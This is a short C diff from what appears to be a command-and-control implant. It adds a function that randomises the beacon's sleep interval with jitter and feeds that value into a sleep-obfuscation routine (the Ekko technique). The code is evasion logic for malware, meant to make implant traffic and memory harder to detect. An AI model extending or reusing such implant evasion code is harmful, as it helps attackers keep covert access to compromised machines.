@@ -470,8 +470,29 @@ VOID EkkoObf( DWORD TimeOut )
     }
 }
 
-VOID SleepObf( UINT32 TimeOut )
+UINT32 SleepTime( VOID )
 {
+    UINT32 SleepTime    = Instance.Config.Sleeping * 1000;
+    UINT32 MaxVariation = ( Instance.Config.Jitter * SleepTime ) / 100;
+    ULONG  Rand         = 0;
+
+    if ( MaxVariation )
+    {
+        Rand = RandomNumber32();
+        Rand = Rand % MaxVariation;
+        if ( RandomBool() )
+            SleepTime += Rand;
+        else
+            SleepTime -= Rand;
+    }
+
+    return SleepTime;
+}
+
+VOID SleepObf( VOID )
+{
+    UINT32 TimeOut = SleepTime();
+
     DWORD Technique = Instance.Config.Implant.SleepMaskTechnique;
 
     /* dont do any sleep obf. waste of resources */
